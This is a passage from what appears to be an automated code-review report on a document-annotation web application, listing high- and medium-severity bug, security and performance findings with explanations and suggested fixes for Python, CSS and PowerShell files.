-        addresses = {item[4][0] for item in socket.getaddrinfo(host, parsed.port or (443 if parsed.scheme == "https" else 80), type=socket.SOCK_STREAM)}
+        port = parsed.port or (443 if parsed.scheme == "https" else 80)
+        addresses = {item[4][0] for item in socket.getaddrinfo(host, port, type=socket.SOCK_STREAM)}
```

### `backend/app/services/vault.py:41-43`

*security · high*

Any string that is not a valid Fernet key is silently converted into a key with a single, unsalted SHA-256. Two problems: (1) a malformed/typo'd `TABULARIUM_VAULT_KEY` (e.g. value copied with quotes) never fails fast — secrets get written under an unintended derived key, `unreadable_names()` reports nothing while the typo is in place, and the data becomes unreadable the moment the key is corrected; (2) for a human passphrase this is a fast, unsalted KDF, so a low-entropy key can be brute-forced offline from a stolen `secrets` table. Validate strictly (reject keys that are not valid Fernet keys) or, if passphrases must be supported, derive with PBKDF2/scrypt and a documented salt/iteration count.

Current code:

```
    except (ValueError, UnicodeEncodeError):
        key = base64.urlsafe_b64encode(hashlib.sha256(raw.encode()).digest())
        return Fernet(key)
```

### `backend/tests/conftest.py:59`

*bug · high*

This reassigns `anyio.to_thread.run_sync` at module scope of the anyio library, from inside the request path, and never restores the original. Two problems:
1. The mutation is process-wide and permanent for the rest of the session, so any application code (or third-party lib such as httpx/anyio internals) that legitimately awaits `run_sync` to offload blocking work will silently execute it inline on the event loop instead — behaviour that does not match production and can deadlock/hang.
2. Patching on every request is redundant and hides ordering issues (the first request mutates global state for everything that runs afterwards, including other tests).

Apply the patch once (ideally via a `monkeypatch`-style fixture that restores it at teardown) instead of mutating the library attribute inside `_request`.

Current code:

```
            anyio.to_thread.run_sync = _run_direct
```

### `backend/tests/conftest.py:65`

*bug · high*

The application lifespan is entered and exited for every single request, whereas Starlette's `TestClient` runs it once for the `with TestClient(app) as client:` block. `app/main.py::lifespan` performs stateful work (`init_db()`, `live.hub.bind_loop(...)`, `reconcile_jobs()` for trainer/serve/recognition/benchmark/cloud/auto_training); running it per request means:
- reconciliation and DB initialization are executed N times per test, which can reorder/reset app state between requests of the same test (e.g. jobs started by the previous request);
- `live.hub.bind_loop()` keeps a reference to the loop that `asyncio.run` closes immediately after the request, so a later `hub.publish(...)` (via `call_soon_threadsafe`) targets a closed loop.

Enter the lifespan once (in `__enter__`) with a single long-lived loop, and close it in `__exit__`, rather than around each request.

Current code:

```
                async with self.app.router.lifespan_context(self.app):
```

### `frontend/src/index.css:982-983`

*bug · high*

`touch-action: none` disables *all* browser touch gestures on the sheet host — panning and pinch-zoom included — which directly contradicts the comment above it ("il browser può ancora fare pan, ma non zoomare il documento"). The JS in UniverSheet.tsx only intercepts two-finger pinch (touchstart/touchmove with `touches.length === 2`); single-finger panning and page scrolling over the sheet are then handled by nobody, so on a phone a tall sheet cannot be scrolled and the surrounding modal cannot be scrolled by dragging over the sheet. Blocking pinch-zoom also removes the browser zoom escape hatch (WCAG 1.4.4/1.4.10). Use `touch-action: pan-x pan-y` (or `manipulation`) so native pan stays available while the pinch handler keeps controlling the sheet zoom.

```diff
-    touch-action: none;
-    overscroll-behavior: contain;
+    touch-action: pan-x pan-y;
+    overscroll-behavior: contain;
```

### `scripts/benchmark_dewarp.py:50`

*bug · high*

The output filename is derived only from `source.stem`, so two inputs with the same basename in different directories (e.g. `runA/page.png` and `runB/page.png`) map to the same `page__raw.png`. The second run silently overwrites the first image and the report ends up with two `items` pointing at the identical `output` path, which corrupts the benchmark comparison. Include a path-derived unique key (or a per-source subdirectory) in the destination name.

```diff
-            destination = args.output / f"{source.stem}__{engine}.png"
+            slug = "__".join(source.resolve().with_suffix("").parts[-2:]).replace("/", "_")
+            destination = args.output / f"{slug}__{engine}.png"
```

### `scripts/benchmark_end2end.py:69`

*bug · high*

Timeout wiring is inconsistent: the HTTP client is built with a timeout clamped to 5-30 s, while each `end2end` call receives `args.timeout` (default 300 s). `VllmClient._chat` uses `timeout=(10, self.timeout)` as the read timeout, so for non-streaming adapters (and for any token gap longer than 30 s while streaming) `requests` raises a read timeout long before the intended 300 s budget; the reported `wall_s`/failures then reflect the client clamp, not the value under test. `int()` also silently truncates fractional `--timeout` values. Use the same budget for the HTTP client, e.g. `timeout=int(args.timeout)`.

```diff
-    client = inference.VllmClient(timeout=min(30, max(5, int(args.timeout))))
+    client = inference.VllmClient(timeout=max(5, int(args.timeout)))
```

### `scripts/run.ps1:26`

*bug · high*

The build is launched without checking `$LASTEXITCODE`. `$ErrorActionPreference = "Stop"` (set here and re-set inside `build_frontend.ps1`) does not turn a non-zero native exit code (`npm run build`) into a terminating error on Windows PowerShell 5.1 nor on PowerShell 7 (unless `$PSNativeCommandUseErrorActionPreference` is enabled). A failed build therefore silently falls through and the script starts uvicorn serving a missing/stale `frontend\dist` (unlike `run.sh`, which relies on `set -e`). Check the exit code and abort explicitly.

```diff
-    & (Join-Path $PSScriptRoot "build_frontend.ps1")
+    & (Join-Path $PSScriptRoot "build_frontend.ps1")
+    if ($LASTEXITCODE -ne 0) {
+        throw "Frontend build failed (exit code $LASTEXITCODE)."
+    }
```

### `scripts/run.ps1:31`

*bug · high*

The uvicorn exit status is never propagated: PowerShell scripts terminate with `0` unless an explicit `exit` is used, so a launcher/CI/task-scheduler caller sees success even when the server fails to start (missing venv, port already in use, import error). Also, the interpreter path is hardcoded, so a missing venv surfaces only as a generic CommandNotFound. Verify the executable and forward `$LASTEXITCODE`.

```diff
-& ".venv\Scripts\uvicorn.exe" app.main:app --host $hostAddr --port $port
+$uvicorn = Join-Path $root "backend\.venv\Scripts\uvicorn.exe"
+if (-not (Test-Path $uvicorn)) {
+    throw "Interprete non trovato: $uvicorn (crea prima l'ambiente backend)."
+}
+& $uvicorn app.main:app --host $hostAddr --port $port
+exit $LASTEXITCODE
```

### `scripts/run_backend.ps1:6`

*bug · high*

The native process exit status is never propagated. `$ErrorActionPreference = "Stop"` does not make native command failures terminating (on Windows PowerShell 5.1 it never does, and on 7.x only when `$PSNativeCommandUseErrorActionPreference` is enabled), and `pwsh -File`/`powershell -File` returns 0 when the script ends without an explicit `exit`. So a failed startup (port already in use, bad env, import error) or a crash of Uvicorn is reported to the caller as success, silently breaking any wrapper/CI usage. Propagate `$LASTEXITCODE`.

```diff
-& ".venv\Scripts\uvicorn.exe" app.main:app --host $hostAddr --port $port --reload
+& ".venv\Scripts\uvicorn.exe" app.main:app --host $hostAddr --port $port --reload
+exit $LASTEXITCODE
```

### `scripts/run_frontend.ps1:4`

*bug · high*

`npm run dev` is a native command: `$ErrorActionPreference = "Stop"` does NOT turn a non-zero exit status into a terminating error (and `$PSNativeCommandUseErrorActionPreference` is not set). If Vite fails to start (missing node_modules, port in use, compile error on startup), the script still ends with exit code 0, so CI or a wrapper script that calls it will report success. Check `$LASTEXITCODE` and propagate it. Note the other sibling runner (`scripts/run_backend.ps1`) has the same gap, but the fix belongs to this file.

```diff
-npm run dev
+npm run dev
+if ($LASTEXITCODE -ne 0) { exit $LASTEXITCODE }
```

### `scripts/setup_backend.ps1:5-6`

*bug · high*

Two problems in the version probe: (1) if `$py` does not resolve (e.g. `python` missing, or a bogus `PYTHON` value), the call operator raises a terminating `CommandNotFoundException` before the `$LASTEXITCODE` check, so the friendly "Python non trovato" message is unreachable and the user sees the raw error; (2) when the invoked program prints nothing to stdout (Windows Store `python.exe` alias stub, wrong executable, output redirected), `$pyVersion` is `$null` and `.Trim()` throws "You cannot call a method on a null-valued expression". Wrap the probe in try/catch and validate the captured text.

```diff
-$pyVersion = (& $py -c "import sys; print(f'{sys.version_info[0]}.{sys.version_info[1]}')").Trim()
-if ($LASTEXITCODE -ne 0) {
+$pyVersion = $null
+try {
+    $pyVersion = (& $py -c "import sys; print(f'{sys.version_info[0]}.{sys.version_info[1]}')" 2>$null | Out-String).Trim()
+} catch {
+    $pyVersion = $null
+}
+if ($LASTEXITCODE -ne 0 -or -not $pyVersion) {
```

### `scripts/setup_backend.ps1:17-18`

*bug · high*

`$ErrorActionPreference = "Stop"` does not turn a non-zero exit code of a native executable into an exception (and `$PSNativeCommandUseErrorActionPreference` is false by default), so failures of `venv` and of both `pip install` calls are silently ignored. The script still ends with "Backend pronto." while dependencies are missing; the only thing that surfaces later is the misleading `cryptography` error (or a broken `.venv`). Check `$LASTEXITCODE` after each native call and fail fast.

```diff
-& ".venv\Scripts\python.exe" -m pip install --upgrade pip -q
-& ".venv\Scripts\python.exe" -m pip install -r requirements.txt -r requirements-dev.txt
+$venvPy = ".venv\Scripts\python.exe"
+& $venvPy -m pip install --upgrade pip -q
+if ($LASTEXITCODE -ne 0) {
+    throw "Aggiornamento di pip fallito (exit $LASTEXITCODE)."
+}
+& $venvPy -m pip install -r requirements.txt -r requirements-dev.txt
+if ($LASTEXITCODE -ne 0) {
+    throw "Installazione delle dipendenze fallita (exit $LASTEXITCODE)."
+}
```

### `scripts/setup_frontend.ps1:4-5`

*bug · high*

`$ErrorActionPreference = "Stop"` does not make a failing native command terminate the script: on Windows PowerShell 5.1 it has no effect on `npm`, and on PowerShell 7.3+ it only applies when `$PSNativeCommandUseErrorActionPreference` is enabled (off by default in 7.3). As a result a failed `npm ci` (lockfile mismatch, network/auth failure, Node too old, etc.) falls through and the script still prints ">> Frontend pronto.", falsely reporting success. The sibling `scripts/setup_backend.ps1` does check `$LASTEXITCODE`; do the same here. Note the bash counterpart uses `set -euo pipefail` and does fail correctly.

```diff
-npm ci
-Write-Host ">> Frontend pronto."
+npm ci
+if ($LASTEXITCODE -ne 0) {
+    throw "npm ci non riuscito (exit code $LASTEXITCODE): controlla Node/npm e frontend/package-lock.json"
+}
+Write-Host ">> Frontend pronto."
```

### `scripts/test_backend.ps1:6`

*bug · high*

pytest's exit status is left only in `$LASTEXITCODE` and never checked or returned, and `$ErrorActionPreference = 'Stop'` does **not** turn a nonzero native exit code into a terminating error (that only happens with `$PSNativeCommandUseErrorActionPreference`, which is off by default). A CI job or any wrapper invoking this script as `./scripts/test_backend.ps1` therefore sees a successful script run even when tests fail, unlike the Bash counterpart which propagates the status via `set -e`. Explicitly propagate the exit code at the end of the script.

```diff
-& '.venv\Scripts\python.exe' -m pytest @args
+& '.venv\Scripts\python.exe' -m pytest @args
+exit $LASTEXITCODE
```
## Medium — 332

- **`backend/app/adapters/annotations.py:68-72`** (bug) — The unconditional `return 1` breaks the documented contract ("Returns the number of rows changed: 0 means another writer got there first"). If `page_id` does not exist, no revision was advanced yet the caller is told the write succeeded, masking a missing…
- **`backend/app/adapters/annotations.py:115-116`** (bug) — An empty `ids` list yields `DELETE FROM blocks WHERE id IN ()`, which SQLite rejects with a syntax error. The current caller (`services/blocks.py:144`) guards with `if removed:`, but this adapter helper is a public API and silently blows up on the natural…
- **`backend/app/adapters/annotations.py:157-158`** (performance) — `sqlite3.Connection` used as a context manager only commits/rolls back the transaction — it never closes the connection. Here the handle is released only by CPython refcounting when the generator frame dies, and a retained reference (e.g. an exception…
- **`backend/app/adapters/assignment.py:98`** (bug) — `settle_review` sets `pages.status='review'` when the reviewer requests changes, but `reopen_if_settled` (the companion call made by `services/page_work.assign` right after `upsert`) only reopens `qa`/`approved`/`exported`. Reassigning a page in the…
- **`backend/app/adapters/assignment.py:110`** (bug) — Same pattern as `mark_pending`: the `pages` UPDATE runs unconditionally, without any prior-state/version guard on the `page_work` row, so a stale or missing work row (e.g. one already moved back to `annotation` by `upsert`) still flips the page to…
- **`backend/app/adapters/blocks.py:47-50`** (bug) — Any `mode` that is not `"merge"` or `"replace_drafts"` falls into this branch and deletes every block on the page. Validation exists in `api/prelabel.py` / `services/recognition.py`, but `PrelabelOptions.mode` also comes from `recognition_runs.mode` read…
- **`backend/app/adapters/compute_profiles.py:31-38`** (bug) — The insert always lists every column and passes `None` for anything the caller omits, so the schema defaults declared in `db.py` (`name/provider/purpose/model_adapter_id/served_model_name/endpoint` are `NOT NULL`, `hardware_profile_json` defaults to…
- **`backend/app/adapters/compute_profiles.py:53`** (bug) — `activate_only` clears every other row before touching the target without checking that the target exists: if `profile_id` is stale/deleted, the function succeeds and leaves the table with *zero* active profiles, silently breaking the "exactly one active"…
- **`backend/app/adapters/compute_profiles.py:63-64`** (bug) — This helper contradicts the module docstring ("exactly one may be active"): setting every row active violates the single-active invariant and, because of the partial unique index `idx_compute_active ... WHERE active=1` created in `db.py`, it will raise…
- **`backend/app/adapters/custom_models.py:29-32`** (bug) — `db.connect()` returns a plain `sqlite3.Connection`, whose context manager only commits/rolls back — it never calls `close()`. Every helper here therefore relies on CPython refcounting to release the SQLite handle; under another interpreter (or if a…
- **`backend/app/adapters/custom_models.py:46`** (bug) — `source_run_id` has no UNIQUE constraint in the schema (db.py migration 16 adds it as a plain column), and this `fetchone()` has no `ORDER BY`, so if a run ever produces more than one row (e.g. two concurrent `register_training_checkpoint` calls both…
- **`backend/app/adapters/custom_models.py:62`** (bug) — `fields.get(column)` makes `insert` lossy in both directions: a key that is not in the selected tuple (e.g. `source_path`/`source_run_id` passed with `merged=False`, or a misspelled key) is silently discarded, and a missing *nullable* column (e.g.…
- **`backend/app/adapters/exports.py:35-40`** (performance) — This is an N+1 access pattern: one query for pages, then per page one query for blocks and one for tables, so a project with N pages issues 1 + 2N statements (plus one extra connection per call site — `collect_pages_with_blocks` is called several times by…
- **`backend/app/adapters/inference_config.py:24`** (bug) — `LIKE 'inference_%'` does not match the literal prefix `inference_`: in SQL `_` is a single-character wildcard (and `LIKE` is case-insensitive for ASCII by default). So unrelated keys such as `inferenceXurl` or `Inference_url` are also returned and then…
- **`backend/app/adapters/jobs.py:31-34`** (bug) — Catching every `sqlite3.OperationalError` here hides real failures such as `no such column: kind` (schema drift) or `database is locked`, and callers like `serve_manager._persisted_running`/`modal_manager._persisted_running` then treat a broken jobs table…
- **`backend/app/adapters/jobs.py:227`** (security) — `columns` is spliced into the SQL with an f-string (same pattern in `latest_of_kind`). Today both callers in `services/cloud_manager.py` pass hard-coded literals, so it is not exploitable yet, but this adapter is the module-level API for every service and…
- **`backend/app/adapters/jobs.py:253-254`** (bug) — Check-then-insert without a uniqueness constraint or a transaction that protects it: two concurrent writers (the cloud polling loops run in parallel with request handlers) can both see `row is None` and insert a second `cloud_resource` row for the same…
- **`backend/app/adapters/jobs.py:267-268`** (bug) — The UPDATE branch clears `ended_at` whenever `terminal` is false. A provider-status flicker (e.g. Vast briefly reporting `running` for an instance previously recorded as `stopped`) therefore re-opens a closed resource, and because `cloud_usage` always…
- **`backend/app/adapters/jobs.py:288-290`** (bug) — Same over-broad suppression as `running()`: a `no such column`, `database is locked`, or a corrupted `cost_json` column error is reported to the caller as "cost unknown" instead of surfacing. Guard only the missing-table case (as `latest()` does) and let…
- **`backend/app/adapters/models.py:7`** (maintainability) — This helper duplicates the data-access module that already owns the `custom_models` table (`app/adapters/custom_models.py`), which is why the only call site (`services/model_registry.delete_model`) already imports `custom_models` and also opens an extra…
- **`backend/app/adapters/models.py:9`** (bug) — `sqlite3.Connection`'s context manager only wraps the *transaction* (commit/rollback); it does not close the connection. `connect()` returns a bare `sqlite3.Connection`, so here the handle stays open until it is garbage collected. Wrap it in…
- **`backend/app/adapters/pages.py:46-51`** (performance) — The derived table aggregates **every** `blocks` row in the database (`GROUP BY page_id` without any project/page restriction) only to keep the rows of the pages matched by the outer query. The page list is a hot endpoint and `blocks` grows with the whole…
- **`backend/app/adapters/pages.py:68-69`** (security) — `update_fields` builds the `SET` clause by interpolating raw dict keys into SQL. Today the only caller (`api/pages.py::update_page`) feeds it `PageUpdate.model_dump()`, so the keys are fixed, but nothing in this adapter enforces that contract — any future…
- **`backend/app/adapters/projects.py:53-54`** (bug) — `OperationalError` covers much more than "the table/DB does not exist": `database is locked`, disk I/O errors, a failing migration, etc. Swallowing all of them makes `settings_json_or_none` return `None`, which callers translate into a 404…
- **`backend/app/adapters/projects.py:235`** (bug) — Every other project aggregate here (`summaries`, `workflow_stats`) filters `status != 'missing'`, but the annotation queue does not. Pages flagged `missing` by `adapters/pages.py` therefore show up in the working queue (and get an "already_worked" reason),…
- **`backend/app/adapters/rate_limits.py:40`** (bug) — `bump()` ignores `cursor.rowcount`: when the row is gone (concurrently cleared by `clear()`/`reset()`, or a window that expired between the read and the write) the UPDATE is a silent no-op. The attempt is then never counted while the caller believes it…
- **`backend/app/adapters/runs.py:214-217`** (bug) — `start` returns the row selected *before* the UPDATE, so the returned dict still has `state='queued'` and `started_at`/`heartbeat_at` set to their old (NULL) values, contradicting the docstring's "returns the session row" and the fact the session is now…
- **`backend/app/adapters/runs.py:266-267`** (security) — The keys of `**values` are spliced straight into the SQL text. Values are parameterized, so today's internal call sites are safe, but any typo (`result_json_`, `error_msg`) turns into a raw `sqlite3.OperationalError` instead of a clear failure, and any…
- **`backend/app/adapters/runs.py:316-320`** (bug) — `reconcile` flips the interrupted run and its items to `failed` but never recomputes `completed_pages`/`failed_pages` on the run row, so a session interrupted at 3/10 finished pages is reported as `completed_pages=3` even though all 10 items are now…
- **`backend/app/adapters/store.py:18-19`** (bug) — `with connect() as conn:` does not close the connection: `connect()` (db.py) returns a raw `sqlite3.connect(...)`, and the connection context manager only commits/rolls back. Every call in this module (`get`, `put`, `put_raw`, `delete`, `pop`,…
- **`backend/app/adapters/store.py:37-38`** (bug) — `sqlite3.OperationalError` is raised for much more than "no such table": `database is locked`, `attempt to write a readonly database`, `disk I/O error`, `no such database`. Treating all of them as "no overrides" makes a broken/locked database silently look…
- **`backend/app/adapters/store.py:94`** (bug) — The prefix is concatenated into a LIKE pattern without escaping, so `%` and `_` in the argument act as wildcards (`delete_prefix("a_b")` also deletes `axb`), and an empty prefix silently wipes the whole `meta` table, including `schema_version` and all…
- **`backend/app/adapters/users.py:110-112`** (security) — `update_fields` interpolates the dict keys straight into the SQL text and also breaks when `fields` is empty: `", ".join(...)` yields `""`, producing `UPDATE users SET WHERE id=?` (sqlite3.OperationalError: near "WHERE"). The current caller…
- **`backend/app/api/__init__.py:34`** (security) — `system.router` is registered without any router-level auth dependency, so *every* endpoint inside it that does not declare its own dependency is public. Besides `/api/health`, this includes `GET /api/system/info` (see `api/system.py:216`), which returns…
- **`backend/app/api/__init__.py:36-38`** (maintainability) — Access control here is purely conventional: protection depends on each module remembering to declare `dependencies=[Depends(authsvc.get_current_user)]` (or `require_resource(...)` per endpoint). Nothing in this file enforces it, so a new module added to…
- **`backend/app/api/auth.py:107`** (security) — The auth throttling buckets are keyed either by a value any client can pin (`login:{username}`) or by a single global constant (`"setup"`, `"register"`, `"invite"`), so an unauthenticated attacker can keep a bucket saturated and lock the legitimate account…
- **`backend/app/api/auth.py:300`** (security) — The callback authorises the login and links the account purely on the `email` claim. `oidc.identity_from_claims` only rejects the claim when `email_verified` is explicitly `False`, so a provider that omits the claim (or returns it as a string/absent) is…
- **`backend/app/api/blocks.py:95-98`** (bug) — `json.loads("null")` returns `None` without raising, so the `except (TypeError, ValueError)` clause does not protect the comprehension below: a row whose `points` column holds `null` (writable through the PATCH handler above) makes `for px, py in points`…
- **`backend/app/api/blocks.py:175-176`** (bug) — `exclude_unset=True` keeps fields the client explicitly set to `null`, and `BlockUpdate` declares every field as Optional. Two consequences: (1) `PATCH {"label": null}` (same for `kind`/`content`) produces `UPDATE blocks SET label=NULL`, which violates the…
- **`backend/app/api/blocks.py:258-260`** (bug) — Read-modify-write on the whole project settings object across two independent connections: `_load_settings` (`settings_json_or_none`, one connection/transaction) and `_store_custom_labels` (`put_settings`, a second connection/transaction). Two concurrent…
- **`backend/app/api/blocks.py:504-506`** (bug) — The model-returned grid is trusted: `rows`/`cols` come straight from the remote service and are used to build uniform boundaries. If the service answers with `cols == 0` (only guarded for the combined `rows == 0` case), `[i / cols ...]` raises…
- **`backend/app/api/cloud.py:58-63`** (bug) — Unvalidated coercions on JSON input: `payload.get("host", "").strip()` / `payload.get("user", "root").strip()` raise `AttributeError` when the JSON field is explicitly `null`, and `int(payload.get("local_port", 8888))` raises `ValueError`/`TypeError` when…
- **`backend/app/api/cloud.py:90-94`** (bug) — Side effect ordering bug: the tunnel is already running when `save_inference_config` executes, and this call is inside the same `try` whose handler answers 400. If persistence fails, the client sees a failure although the tunnel is up and a retry will call…
- **`backend/app/api/cloud.py:291-293`** (bug) — `payload.get("action", "stop").strip()` raises `AttributeError` (-> 500) when the client sends `"action": null`; the default only applies to a missing key. Use `str(payload.get("action") or "stop").strip()`. The identical pattern exists in `control_runpod`.
- **`backend/app/api/datasets.py:84-87`** (bug) — `read_text()` raises `OSError` (e.g. `FileNotFoundError` when the file disappears between `exists()` and the read, `PermissionError`, or a directory at that path), and none of those are subclasses of `TypeError`/`ValueError`. Such cases therefore escape as…
- **`backend/app/api/deps.py:21-22`** (bug) — `request.path_params` contains the raw string values matched by Starlette (FastAPI converts them only when validating the *endpoint* signature, and that happens after sub-dependencies are resolved). `int()` on a non-numeric segment (e.g. `GET…
- **`backend/app/api/live.py:67`** (performance) — `authorize_page` runs synchronously inside this `async def` handler: `pagestore.get` opens a SQLite connection and queries `pages`, and `require_project_access` performs one or two more queries (`_resolve_user` above does the session lookup too). Doing…
- **`backend/app/api/live.py:128-129`** (bug) — The cursor coordinates are only checked for being `int`/`float`, but Python's `json.loads` accepts `NaN`/`Infinity`, and `float(x)` propagates them. They are then relayed verbatim to every peer, where strict JSON parsers reject `NaN`/`Infinity` as invalid…
- **`backend/app/api/models.py:116`** (bug) — The terminal-state set does not cover all values `install_state()` can return. Besides `installed|failed|cancelled` it returns `absent` (stream opened before the download started) and, for `paddleocr-vl`, `runtime_installing` / `runtime_failed` /…
- **`backend/app/api/models.py:187-188`** (bug) — `start_async()` only *book-keeps* the launch (it returns immediately, phase `preparing`), so `save_inference_config` persists `enabled: true` pointing at the new port before the server exists. If the launch later fails (missing weights, VRAM/KV-cache…
- **`backend/app/api/page_work.py:15-20`** (bug) — `notify` wraps both the dict lookups (`out['page_id']`, `out['annotation_revision']`) and `live.hub.publish` in a broad `except Exception: pass`. This is doubly problematic: 1. `live.LiveHub.publish` is documented to never raise (it catches `RuntimeError`…
- **`backend/app/api/pages.py:148-150`** (maintainability) — `if True:` is leftover scaffolding that makes the whole tail of the function look conditionally reachable; the block should be unindented and the guard removed. Note also that the returned `PageOut` omits `blocks`/`drafts`/`work`, so they serialize as…
- **`backend/app/api/playground.py:45-50`** (security) — `require_project_access` is called after the page/project lookup, so an unauthenticated-to-that-project caller can distinguish the two cases by the response body: a non-existent page returns `"pagina non trovata nel progetto"`, while an existing page in a…
- **`backend/app/api/playground.py:111-115`** (bug) — The `try` block is much wider than the network call: it also contains the bbox normalization (`/ w`, `/ h`) for the official path, so an unrelated error there (e.g. `ZeroDivisionError` when `page["width"]`/`["height"]` are 0 — the schema defaults them to…
- **`backend/app/api/playground.py:143-144`** (maintainability) — The per-item `except Exception` swallows crop and model-recognition failures and returns `content = ""`, so a systematic problem (missing source image region, endpoint down, bad label argument) is indistinguishable from an empty block and leaves no trace.…
- **`backend/app/api/prelabel.py:32-33`** (maintainability) — The recovery failure is swallowed silently: any error from `cloud_manager.reconcile_tunnel()` (or from the second `get_vllm_client()`) disappears and the caller only sees a generic "model_unavailable" at the ping below, so the real cause (tunnel…
- **`backend/app/api/prelabel.py:205`** (performance) — The queue is unbounded and `q.get()` below has no timeout. If the consumer stalls or the generator's `finally` is not reached promptly (e.g. a client disconnect while the sync generator is parked in the threadpool), the producer keeps enqueuing every model…
- **`backend/app/api/prelabel.py:213-214`** (security) — Error events are streamed with `str(event)` verbatim, leaking internal exception text (local paths, upstream URLs with embedded credentials, stack messages) to the browser, and the branch catches `BaseException`, swallowing…
- **`backend/app/api/projects.py:51-52`** (performance) — `_scan_jobs` is a module-level registry that is never pruned: every scan (each carrying a full `report.to_dict()`, potentially large) stays resident for the life of the process. Over time this grows without bound. Store `project_id` in the job entry…
- **`backend/app/api/projects.py:113-114`** (other) — Several endpoints (`put_study_protocol`, `set_gold_set`, `save_pilot_sample`, `put_conventions`, `put_table_hint`, `save_table_header`, `delete_table_header`) do a read-modify-write of the whole `settings_json` blob without any lock or transaction. Because…
- **`backend/app/api/projects.py:368-369`** (performance) — `study_protocol_history` grows without any bound: every save appends a full protocol dict into the settings JSON, which is then read, decoded and re-encoded on every settings access (including read endpoints such as `get_study_protocol`/`qa_report`).…
- **`backend/app/api/projects.py:625-630`** (bug) — Deletion only removes thumbnails/previews and then attempts a non-recursive `rmdir` whose failure is swallowed: `DATA_DIR/<project_id>/uploads/...`, `eval/...`, crops/runs and any other project artefacts stay on disk while the API reports `{"deleted":…
- **`backend/app/api/recognition.py:36-41`** (bug) — Authorization is applied *after* the (limited) query: `list_runs` returns only the newest 50 runs globally, so a non-admin whose runs are older than the 50 newest ones gets an empty/short list even though they do have runs. On top of that, each iteration…
- **`backend/app/api/recognition.py:87-90`** (performance) — `get_run` defaults to `results="all"`, so this ownership check deserialises the raw `result_json` of every page in the run (megabytes for large sessions, as the comment on `_run_out` itself notes) only to compare `project_id` — and the export path then…
- **`backend/app/api/settings.py:17-19`** (security) — `GET /api/settings` is only guarded by authentication, while `PUT` requires admin. The payload returned (`instance_name`, `oidc_issuer`, `oidc_client_id`, `oidc_allowed_domains`, `default_new_user_role`, `allow_registration`) is administrative…
- **`backend/app/api/settings.py:29-32`** (bug) — `except ValueError` is broader than the validation failures this endpoint means to translate: `save_app_settings` also performs `str()`/`json` serialisation and `store.put`, so any `ValueError` raised there for an unrelated reason would be silently…
- **`backend/app/api/system.py:85-87`** (bug) — Inconsistent `vault:` prefix handling. `vault.delete()` strips the prefix (`name.removeprefix("vault:")`) and this module's `get_secret_status` strips it before calling `vault.get()`, but `put` does not: `vault._NAME` allows `:`, so `PUT {name:…
- **`backend/app/api/system.py:222-223`** (security) — This endpoint is public (no auth dependency) yet returns absolute server filesystem paths (`data_dir`, `db_path`) plus platform/Python details. That is unauthenticated path/dependency disclosure to any anonymous caller. Keep the fields but gate the…
- **`backend/app/api/system.py:329-330`** (maintainability) — Broad `except Exception: pass` around the tunnel reconcile swallows every failure (import errors, DB errors, reconcile bugs) with no trace at all. If `reconcile_tunnel()` starts failing, the UI keeps showing a stale loopback URL and there is no log to…
- **`backend/app/api/system.py:450`** (bug) — `payload` is an untyped dict, so `float(payload.get("timeout", 10.0))` raises `ValueError`/`TypeError` (500) for `"abc"` or `null`, and non-positive/very small values are forwarded unchecked (`int(timeout)` below also truncates e.g. `0.5` to `0`, i.e. an…
- **`backend/app/api/system.py:502`** (performance) — `sorted(base.iterdir(), ...)` materializes and sorts the whole directory before `_BROWSE_LIMIT` is enforced inside the loop, so browsing a directory with hundreds of thousands of entries consumes all that memory/latency although the response is capped at…
- **`backend/app/api/training.py:218-222`** (bug) — The GPU rental job is already started (a paid Vast.ai instance may be provisioning) before the audit row is written. If `auditsvc.record` raises (locked/full SQLite DB, disk error), the request returns 500 even though the job is running, and a retry can…
- **`backend/app/api/training.py:306-307`** (bug) — Swallowing every exception and silently `break`ing closes the SSE connection with no `done`/error event and no log line: the client cannot distinguish "training finished" from "backend broke", and the failure is invisible in the server logs. Log the…
- **`backend/app/api/training.py:321-322`** (bug) — `idle` is only incremented when the *entire* serialized payload is byte-identical. The payload includes `gpu` telemetry, which is refreshed by `gpu_snapshot()` (10 s cache) and changes between polls on a busy machine, and `metrics[-200:]`. After the run…
- **`backend/app/api/training.py:325`** (bug) — The termination condition only matches `finished`/`failed`/`stopped`. When the project has no run at all `_status` returns `run: None` → `state` is `None`, and other terminal metadata states (`"error"` written by `trainer.start_run` on launch failure,…
- **`backend/app/api/users.py:22-23`** (performance) — `sqlite3.Connection.__exit__` only commits/rolls back the transaction — it does **not** close the connection. Since `connect()` returns a raw `sqlite3.connect(...)`, this `with` block (and every other one in this module) leaks a connection/file descriptor…
- **`backend/app/cli.py:36`** (bug) — `int(...)` runs eagerly while building the parser, so an empty (`TABULARIUM_PORT=`) or non-numeric env value aborts with a raw `ValueError` traceback before argparse can report anything friendly — this also breaks `tabularium doctor` and `tabularium…
- **`backend/app/cli.py:173-174`** (bug) — An explicit IPv6 bind (e.g. `--host ::1`) is not mapped to localhost and is interpolated without brackets, producing `http://::1:8787`, which is not a valid URL. `urlopen` then raises `ValueError` (not caught by `except OSError` in `_open_when_ready`), so…
- **`backend/app/config.py:59-63`** (bug) — `_refresh()` is never called anywhere in the codebase (only its definition matches), so it is dead code. Worse, if it is ever wired up it produces an inconsistent configuration: it rebinds `ROOT_DIR`/`DATA_DIR`/`DB_PATH` but leaves `MODELS_DIR`,…
- **`backend/app/config.py:111-115`** (bug) — The blanket `except Exception` swallows invalid JSON with no logging, so a typo in `TABULARIUM_VLLM_EXTRA_HEADERS` silently drops the headers (e.g. the ngrok/proxy auth header mentioned in the comment) and remote inference then fails with a confusing…
- **`backend/app/config.py:122`** (maintainability) — The module-level doc comment says that with `TABULARIUM_VLLM_MAX_PIXELS` unset each model recipe picks its own default, but the value still falls back to `1_003_520` (MonkeyOCRv2's 1 MP cap). Today callers compensate by re-checking…
- **`backend/app/config.py:167-168`** (bug) — The "does a key already exist?" check (`os.environ`) and the append are not atomic, so two processes starting against the same data root (e.g. a crashed server restarting while another worker/CLI bootstraps, or any deployment that does not honour the…
- **`backend/app/db.py:236-237`** (security) — The table rebuild relies on `PRAGMA foreign_keys = OFF` followed by `PRAGMA foreign_keys = ON` at the end of the same script. If any statement in between raises, the connection is left with foreign keys disabled and every following migration in…
- **`backend/app/db.py:482-486`** (bug) — `_stored_version` returns `None` both when the row is missing *and* when the value is not an integer. In the second case the row already exists, so this unconditional `INSERT` fails with `sqlite3.IntegrityError` (PRIMARY KEY conflict) and the startup dies…
